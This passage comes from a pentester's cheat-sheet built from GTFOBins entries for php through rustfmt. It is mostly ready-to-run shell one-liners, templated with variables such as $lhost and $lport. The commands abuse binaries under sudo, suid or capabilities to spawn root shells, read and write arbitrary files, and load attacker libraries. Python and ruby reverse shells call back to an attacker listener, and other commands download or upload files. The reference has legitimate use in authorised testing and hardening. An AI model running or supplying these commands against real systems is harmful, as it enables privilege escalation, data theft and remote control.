php -r 'readfile("$file_in");'
```
<!-- cheat
var file_in
-->

### php file-write

Write php file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Php File Write (php file write (sudo / suid / unprivileged)"
php -r 'file_put_contents("$file_out", "$data");'
```
<!-- cheat
var data
var file_out
-->

### php download

Download php download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Php Download (php download (sudo / suid / unprivileged)"
php -r '$c=file_get_contents("$scheme://$lhost$file_in"); file_put_contents("$file_out", $c);'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### php upload

Upload php upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Php Upload (php upload (sudo / suid / unprivileged)"
php -S 0.0.0.0:80
```
<!-- cheat
-->

## pic

### pic shell

Spawn pic shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pic Shell (pic shell (sudo / suid / unprivileged)"
pic -U
.PS
sh X sh X
```
<!-- cheat
-->

### pic file-read

Read pic file read with the Gtfobins GTFOBins technique.

The output is prefixed with some content.

```sh title:"GTFOBins Read Pic File Read (pic file read (sudo / suid / unprivileged)"
pic $file_in
```
<!-- cheat
var file_in
-->

## pico

Alias of [nano](#nano). All techniques from `nano` apply.

## pidstat

### pidstat shell

Spawn pidstat shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pidstat Shell (pidstat shell (sudo / suid / unprivileged)"
pidstat -e /bin/sh
```
<!-- cheat
-->

#### pidstat shell - suid override
Spawn pidstat shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Pidstat Shell (pidstat shell (suid variant)"
pidstat -e /bin/sh -p
```
<!-- cheat
-->

## pip

### pip shell

Spawn pip shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pip Shell (pip shell (sudo / unprivileged)"
pip config --editor '/bin/sh -s' edit
```
<!-- cheat
-->

### pip inherit (inherits from python)

Run pip inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```  The `--break-system-packages` flag can be omitted in older systems.

```sh title:"GTFOBins Run Pip Inherit (inherits from Python) (pip inherit from python (sudo / unprivileged)"
echo '...' >setup.py
pip install --break-system-packages .
```
<!-- cheat
-->

## pipx

### pipx inherit (inherits from python)

Run pipx inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).

```sh title:"GTFOBins Run Pipx Inherit (inherits from Python) (pipx inherit from python (sudo / unprivileged)"
echo '...' >$script
pipx run $script
```
<!-- cheat
var script
-->

## pkexec

### pkexec shell

Spawn pkexec shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pkexec Shell (pkexec shell (sudo)"
pkexec /bin/sh
```
<!-- cheat
-->

## pkg

### pkg command

Execute pkg command with the Gtfobins GTFOBins technique.

Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t freebsd -a all --before-install x.sh . ```

```sh title:"GTFOBins Execute Pkg Command (pkg command (sudo)"
pkg install -y --no-repo-update ./x-1.0.txz
```
<!-- cheat
-->

## plymouth

### plymouth shell

Spawn plymouth shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Plymouth Shell (plymouth shell (sudo / suid / unprivileged)"
plymouth ask-for-password --prompt=x --command=/bin/sh
```
<!-- cheat
-->

#### plymouth shell - suid override
Spawn plymouth shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Plymouth Shell (plymouth shell (suid variant)"
plymouth ask-for-password --prompt=x --command='/bin/sh -p'
```
<!-- cheat
-->

## podman

### podman shell

Spawn podman shell with the Gtfobins GTFOBins technique.

This requires an actual image to be available (e.g., `alpine`) downloading it if not present.

```sh title:"GTFOBins Spawn Podman Shell (podman shell (sudo / unprivileged)"
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```
<!-- cheat
-->

## poetry

### poetry inherit (inherits from python)

Run poetry inherit (inherits from python) with the Gtfobins GTFOBins technique.

This allows to run Python code (`...`).  A valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`.

```sh title:"GTFOBins Run Poetry Inherit (inherits from Python) (poetry inherit from python (sudo / unprivileged)"
echo '...' >$tmp_file
poetry run python $tmp_file
```
<!-- cheat
var tmp_file
-->

## posh

### posh shell

Spawn posh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Posh Shell (posh shell (sudo / unprivileged)"
posh
```
<!-- cheat
-->

## pr

### pr file-read

Read pr file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Pr File Read (pr file read (sudo / suid / unprivileged)"
pr -T $file_in
```
<!-- cheat
var file_in
-->

## procmail

### procmail command

Execute procmail command with the Gtfobins GTFOBins technique.

The program is picky about the file ownership, and waits for some input.

```sh title:"GTFOBins Execute Procmail Command (procmail command (sudo / unprivileged)"
echo -e ':0\n| $cmd_file >$tmp_file
procmail -m $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## pry

### pry inherit (inherits from irb)

Run pry inherit (inherits from irb) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Pry Inherit (inherits from Irb) (pry inherit from irb (sudo / unprivileged)"
pry
```
<!-- cheat
-->

## psftp

### psftp shell

Spawn psftp shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Psftp Shell (psftp shell (sudo / suid / unprivileged)"
psftp
!/bin/sh
```
<!-- cheat
-->

## psql

A valid PostgreSQL server must be available to connect to.

### psql shell

Spawn psql shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Psql Shell (psql shell (sudo / suid / unprivileged)"
psql
\! /bin/sh
```
<!-- cheat
-->

### psql inherit (inherits from less)

Run psql inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Psql Inherit (inherits from Less) (psql inherit from less (sudo / suid / unprivileged)"
psql
\?
```
<!-- cheat
-->

## ptx

While the program is capable of reading the file, it outputs a "permuted index" of its content, thus altering it. Adjusting the options could yield more readable outputs.

### ptx file-read

Read ptx file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ptx File Read (ptx file read (sudo / suid / unprivileged)"
ptx -w 999 $file_in
```
<!-- cheat
var file_in
-->

## puppet

### puppet shell

Spawn puppet shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Puppet Shell (puppet shell (sudo / unprivileged)"
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```
<!-- cheat
-->

### puppet file-read

Read puppet file read with the Gtfobins GTFOBins technique.

The read file content is corrupted by the `diff` output format. The actual `diff` command is executed.

```sh title:"GTFOBins Read Puppet File Read (puppet file read (sudo / unprivileged)"
puppet filebucket -l diff /dev/null $file_in
```
<!-- cheat
var file_in
-->

### puppet file-write

Write puppet file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Puppet File Write (puppet file write (sudo / unprivileged)"
puppet apply -e 'file { "$file_out": content => "$data" }'
```
<!-- cheat
var data
var file_out
-->

## pwsh

### pwsh shell

Spawn pwsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Pwsh Shell (pwsh shell (sudo / unprivileged)"
pwsh
```
<!-- cheat
-->

### pwsh file-write

Write pwsh file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Pwsh File Write (pwsh file write (sudo / unprivileged)"
pwsh -c '"$data" | Out-File $file_out'
```
<!-- cheat
var data
var file_out
-->

## pygmentize

### pygmentize file-read

Read pygmentize file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Pygmentize File Read (pygmentize file read (sudo / unprivileged)"
pygmentize -l text $file_in
```
<!-- cheat
var file_in
-->

## pyright

### pyright file-read #1

Read pyright file read #1 with the Gtfobins GTFOBins technique.

Content is leaked as error messages.

```sh title:"GTFOBins Read Pyright File Read #1 (pyright file read (sudo / unprivileged)"
pyright $file_in
```
<!-- cheat
var file_in
-->

### pyright file-read #2

Read pyright file read #2 with the Gtfobins GTFOBins technique.

Content is leaked as error messages in JSON format.

```sh title:"GTFOBins Read Pyright File Read #2 (pyright file read (sudo / unprivileged)"
pyright --outputjson $file_in
```
<!-- cheat
var file_in
-->

### pyright file-read #3

Read pyright file read #3 with the Gtfobins GTFOBins technique.

Recursively walks directories, parsing all Python files and leaking some contents through diagnostics.

```sh title:"GTFOBins Read Pyright File Read #3 (pyright file read (sudo / unprivileged)"
pyright -w $dir_in/
```
<!-- cheat
var dir_in
-->

## python

The payloads are compatible with both Python version 2 and 3.

### python shell

Spawn python shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Python Shell (python shell (capabilities / sudo / suid / unprivileged)"
python -c 'import os; os.execl("/bin/sh", "sh")'
```
<!-- cheat
-->

#### python shell - capabilities override
Spawn python shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Python Shell (python shell (capabilities variant)"
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
<!-- cheat
-->

#### python shell - suid override
Spawn python shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Python Shell (python shell (suid variant)"
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
<!-- cheat
-->

### python reverse-shell

Start python reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Python Reverse Shell (python reverse shell (sudo / suid / unprivileged)"
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect(("$lhost",$lport))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
```
<!-- cheat
import tun_ip
import lports
-->

### python file-read

Read python file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Python File Read (python file read (sudo / suid / unprivileged)"
python -c 'print(open("$file_in").read())'
```
<!-- cheat
var file_in
-->

### python file-write

Write python file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Python File Write (python file write (sudo / suid / unprivileged)"
python -c 'open("$file_out","w+").write("$data")'
```
<!-- cheat
var data
var file_out
-->

### python download

Download python download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Python Download (python download (sudo / suid / unprivileged)"
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("$scheme://$lhost$file_in", "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### python upload #1

Upload python upload #1 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Python Upload #1 (python upload (sudo / suid / unprivileged)"
python -c 'import sys
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen("$scheme://$lhost", open("$file_in", "rb").read())'
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### python upload #2

Upload python upload #2 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Python Upload #2 (python upload (sudo / suid / unprivileged)"
python -c 'import sys
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", $lport), s.SimpleHTTPRequestHandler).serve_forever()'
```
<!-- cheat
import lports
-->

### python library-load

Run python library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Python Library Load (python library load (capabilities / sudo / suid / unprivileged)"
python -c 'from ctypes import cdll; cdll.LoadLibrary("$lib")'
```
<!-- cheat
var lib
-->

## qpdf

### qpdf file-read

Read qpdf file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Qpdf File Read (qpdf file read (sudo / suid / unprivileged)"
qpdf --empty --add-attachment $file_in --key=x -- $file_out
qpdf --show-attachment=x $file_out
```
<!-- cheat
var file_in
var file_out
-->

## rake

### rake file-read

Read rake file read with the Gtfobins GTFOBins technique.

The file is actually parsed and the first wrong line is returned in an error message.

```sh title:"GTFOBins Read Rake File Read (rake file read (sudo / unprivileged)"
rake -f $file_in
```
<!-- cheat
var file_in
-->

### rake inherit (inherits from ruby)

Run rake inherit (inherits from ruby) with the Gtfobins GTFOBins technique.

This allows to run Ruby code (`...`).

```sh title:"GTFOBins Run Rake Inherit (inherits from Ruby) (rake inherit from ruby (sudo / unprivileged)"
rake -p '...'
```
<!-- cheat
-->

## ranger

### ranger shell

Spawn ranger shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ranger Shell (ranger shell (sudo / unprivileged)"
ranger
S
```
<!-- cheat
-->

## rc

### rc shell

Spawn rc shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rc Shell (rc shell (sudo / suid / unprivileged)"
rc
```
<!-- cheat
-->

## readelf

### readelf file-read

Read readelf file read with the Gtfobins GTFOBins technique.

Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.

```sh title:"GTFOBins Read Readelf File Read (readelf file read (sudo / suid / unprivileged)"
readelf -a @$file_in
```
<!-- cheat
var file_in
-->

## red

Alias of [ed](#ed). All techniques from `ed` apply.

## redcarpet

### redcarpet file-read

Read redcarpet file read with the Gtfobins GTFOBins technique.

The file is actually parsed as a Markdown file.

```sh title:"GTFOBins Read Redcarpet File Read (redcarpet file read (sudo / unprivileged)"
redcarpet $file_in
```
<!-- cheat
var file_in
-->

## redis

### redis file-write

Write redis file write with the Gtfobins GTFOBins technique.

Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.  Keep in mind that it's actually the server to perform the file write.

```sh title:"GTFOBins Write Redis File Write (redis file write (sudo / suid / unprivileged)"
redis-cli -h 127.0.0.1
config set dir $dir_out/
config set dbfilename output-file
set x "$data"
save
```
<!-- cheat
var data
var dir_out
-->

## restic

### restic shell #1

Spawn restic shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Restic Shell #1 (restic shell (sudo / suid / unprivileged)"
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```
<!-- cheat
-->

#### restic shell #1 - suid override
Spawn restic shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Restic Shell #1 (restic shell (suid variant)"
RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
```
<!-- cheat
-->

### restic shell #2

Spawn restic shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Restic Shell #2 (restic shell (sudo / suid / unprivileged)"
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```
<!-- cheat
-->

#### restic shell #2 - suid override
Spawn restic shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Restic Shell #2 (restic shell (suid variant)"
restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
```
<!-- cheat
-->

### restic command #1

Execute restic command #1 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Restic Command #1 (restic command (sudo / suid / unprivileged)"
RESTIC_PASSWORD_COMMAND='$cmd_file' restic backup
```
<!-- cheat
var cmd_file
-->

### restic command #2

Execute restic command #2 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Restic Command #2 (restic command (sudo / suid / unprivileged)"
restic --password-command='$cmd_file' backup
```
<!-- cheat
var cmd_file
-->

### restic upload

Upload restic upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Restic Upload (restic upload (sudo / suid / unprivileged)"
restic backup -r rest:$scheme://$lhost:$lport/x $file_in
```
<!-- cheat
import tun_ip
import lports
import scheme
var file_in
-->

## rev

### rev file-read

Read rev file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Rev File Read (rev file read (sudo / suid / unprivileged)"
rev $file_in | rev
```
<!-- cheat
var file_in
-->

## rlogin

### rlogin upload

Upload rlogin upload with the Gtfobins GTFOBins technique.

The file is corrupted by leading and trailing spurious data.

```sh title:"GTFOBins Upload Rlogin Upload (rlogin upload (sudo / suid / unprivileged)"
rlogin -l $data -p $lport $lhost
```
<!-- cheat
import tun_ip
import lports
var data
-->

## rlwrap

### rlwrap shell

Spawn rlwrap shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rlwrap Shell (rlwrap shell (sudo / suid / unprivileged)"
rlwrap /bin/sh
```
<!-- cheat
-->

#### rlwrap shell - suid override
Spawn rlwrap shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Rlwrap Shell (rlwrap shell (suid variant)"
rlwrap /bin/sh -p
```
<!-- cheat
-->

### rlwrap file-write

Write rlwrap file write with the Gtfobins GTFOBins technique.

This adds timestamps to the output file. This relies on the external `echo` command.

```sh title:"GTFOBins Write Rlwrap File Write (rlwrap file write (sudo / suid / unprivileged)"
rlwrap -l $file_out echo $data
```
<!-- cheat
var data
var file_out
-->

## rpm

### rpm shell #1

Spawn rpm shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rpm Shell #1 (rpm shell (sudo / suid / unprivileged)"
rpm --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpm shell #2

Spawn rpm shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rpm Shell #2 (rpm shell (sudo / suid / unprivileged)"
rpm --pipe '/bin/sh 0<&1'
```
<!-- cheat
-->

### rpm command

Execute rpm command with the Gtfobins GTFOBins technique.

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```

```sh title:"GTFOBins Execute Rpm Command (rpm command (sudo)"
rpm -ivh x-1.0-1.noarch.rpm
```
<!-- cheat
-->

### rpm inherit (inherits from lua)

Run rpm inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Rpm Inherit (inherits from Lua) (rpm inherit from lua (sudo / suid / unprivileged)"
rpm --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmdb

### rpmdb shell

Spawn rpmdb shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rpmdb Shell (rpmdb shell (sudo / suid / unprivileged)"
rpmdb --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmdb inherit (inherits from lua)

Run rpmdb inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Rpmdb Inherit (inherits from Lua) (rpmdb inherit from lua (sudo / suid / unprivileged)"
rpmdb --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmquery

### rpmquery shell

Enumerate rpmquery shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Enumerate Rpmquery Shell (rpmquery shell (sudo / suid / unprivileged)"
rpmquery --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmquery inherit (inherits from lua)

Enumerate rpmquery inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Enumerate Rpmquery Inherit (inherits from Lua) (rpmquery inherit from lua (sudo / suid / unprivileged)"
rpmquery --eval '%{lua:...}'
```
<!-- cheat
-->

## rpmverify

### rpmverify shell

Spawn rpmverify shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rpmverify Shell (rpmverify shell (sudo / suid / unprivileged)"
rpmverify --eval '%(/bin/sh 1>&2)'
```
<!-- cheat
-->

### rpmverify inherit (inherits from lua)

Run rpmverify inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Rpmverify Inherit (inherits from Lua) (rpmverify inherit from lua (sudo / suid / unprivileged)"
rpmverify --eval '%{lua:...}'
```
<!-- cheat
-->

## rsync

### rsync shell

Spawn rsync shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Rsync Shell (rsync shell (sudo / suid / unprivileged)"
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```
<!-- cheat
-->

#### rsync shell - suid override
Spawn rsync shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Rsync Shell (rsync shell (suid variant)"
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```
<!-- cheat
-->

## rsyslogd

### rsyslogd command

Execute rsyslogd command with the Gtfobins GTFOBins technique.

In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:  ``` ssh somerandomstring@victim.com ```

```sh title:"GTFOBins Execute Rsyslogd Command (rsyslogd command (sudo)"
cat >$tmp_file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^$cmd_file
EOF

rsyslogd -f $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

## rtorrent

### rtorrent shell

Spawn rtorrent shell with the Gtfobins GTFOBins technique.

After the shell, exit with `Ctrl-Q`.

```sh title:"GTFOBins Spawn Rtorrent Shell (rtorrent shell (sudo / suid / unprivileged)"
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
<!-- cheat
-->

#### rtorrent shell - suid override
Spawn rtorrent shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Rtorrent Shell (rtorrent shell (suid variant)"
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
<!-- cheat
-->

## ruby

### ruby shell

Spawn ruby shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ruby Shell (ruby shell (capabilities / sudo / unprivileged)"
ruby -e 'exec "/bin/sh"'
```
<!-- cheat
-->

#### ruby shell - capabilities override
Spawn ruby shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ruby Shell (ruby shell (capabilities variant)"
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```
<!-- cheat
-->

### ruby reverse-shell

Start ruby reverse shell with the Gtfobins GTFOBins technique.

Connect back to an attacker-controlled listener.

```sh title:"GTFOBins Start Ruby Reverse Shell (ruby reverse shell (sudo / unprivileged)"
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$lhost",$lport);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
<!-- cheat
import tun_ip
import lports
-->

### ruby file-read

Read ruby file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Ruby File Read (ruby file read (sudo / unprivileged)"
ruby -e 'puts File.read("$file_in")'
```
<!-- cheat
var file_in
-->

### ruby file-write

Write ruby file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Ruby File Write (ruby file write (sudo / unprivileged)"
ruby -e 'File.open("$file_out", "w+") { |f| f.write("$data") }'
```
<!-- cheat
var data
var file_out
-->

### ruby download

Download ruby download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Ruby Download (ruby download (sudo / unprivileged)"
ruby -e 'require "open-uri"; download = URI.open("$scheme://$lhost$file_in"); IO.copy_stream(download, "$file_out")'
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### ruby upload

Upload ruby upload with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Ruby Upload (ruby upload (sudo / unprivileged)"
ruby -run -e httpd . -p 80
```
<!-- cheat
-->

### ruby library-load

Run ruby library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Run Ruby Library Load (ruby library load (sudo / unprivileged)"
ruby -e 'require "fiddle"; Fiddle.dlopen("$lib")'
```
<!-- cheat
var lib
-->

## run-mailcap

### run-mailcap inherit #1 (inherits from less)

Run mailcap inherit #1 (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Mailcap Inherit #1 (inherits from Less) (run-mailcap inherit #1 inherit from less (sudo / unprivileged)"
run-mailcap --action=view text/plain:/etc/hosts
```
<!-- cheat
-->

### run-mailcap inherit #2 (inherits from vi)

Run mailcap inherit #2 (inherits from vi) with the Gtfobins GTFOBins technique.

The file must exist and be not empty.

```sh title:"GTFOBins Run Mailcap Inherit #2 (inherits from Vi) (run-mailcap inherit #2 inherit from vi (sudo / unprivileged)"
run-mailcap --action=edit text/plain:$file_out
```
<!-- cheat
var file_out
-->

## run-parts

### run-parts shell #1

Run parts shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Run Parts Shell #1 (run-parts shell (sudo / suid / unprivileged)"
run-parts --new-session --regex '^sh$' /bin
```
<!-- cheat
-->

#### run-parts shell #1 - suid override
Run parts shell #1 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Run Parts Shell #1 (run-parts shell (suid variant)"
run-parts --new-session --regex '^sh$' /bin --arg='-p'
```
<!-- cheat
-->

### run-parts shell #2

Run parts shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Run Parts Shell #2 (run-parts shell (sudo / suid / unprivileged)"
cp /bin/sh $tmp_dir/
run-parts $tmp_dir/
```
<!-- cheat
var tmp_dir
-->

#### run-parts shell #2 - suid override
Run parts shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Run Parts Shell #2 (run-parts shell (suid variant)"
cp /bin/sh $tmp_dir/
run-parts $tmp_dir/ --arg='-p'
```
<!-- cheat
var tmp_dir
-->

## runscript

### runscript shell

Spawn runscript shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Runscript Shell (runscript shell (sudo / suid / unprivileged)"
echo '! exec /bin/sh' >$tmp_file
runscript $tmp_file
```
<!-- cheat
var tmp_file
-->

## rustc

### rustc file-read

Read rustc file read with the Gtfobins GTFOBins technique.

The compiler leaks some file lines in the compiler error.

```sh title:"GTFOBins Read Rustc File Read (rustc file read (sudo / unprivileged)"
rustc $file_in
```
<!-- cheat
var file_in
-->

### rustc file-write

Write rustc file write with the Gtfobins GTFOBins technique.

The comment appears in the compiled program.

```sh title:"GTFOBins Write Rustc File Write (rustc file write (sudo / unprivileged)"
echo 'fn main() { println!("$data"); }' >$tmp_file
rustc $tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### rustc inherit (inherits from less)

Run rustc inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Rustc Inherit (inherits from Less) (rustc inherit from less (sudo / unprivileged)"
rustc --explain E0001
```
<!-- cheat
-->

## rustdoc

### rustdoc file-read

Read rustdoc file read with the Gtfobins GTFOBins technique.

Partial content is displayed as error messages.

```sh title:"GTFOBins Read Rustdoc File Read (rustdoc file read (sudo / unprivileged)"
rustdoc $file_in
```
<!-- cheat
var file_in
-->

### rustdoc file-write

Write rustdoc file write with the Gtfobins GTFOBins technique.

This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.

```sh title:"GTFOBins Write Rustdoc File Write (rustdoc file write (sudo / unprivileged)"
echo '//! $data' >$tmp_file
rustdoc $tmp_file -o $dir_out/
```
<!-- cheat
var data
var dir_out
var tmp_file
-->

## rustfmt

### rustfmt file-read

Read rustfmt file read with the Gtfobins GTFOBins technique.

Partial content is displayed as error messages.

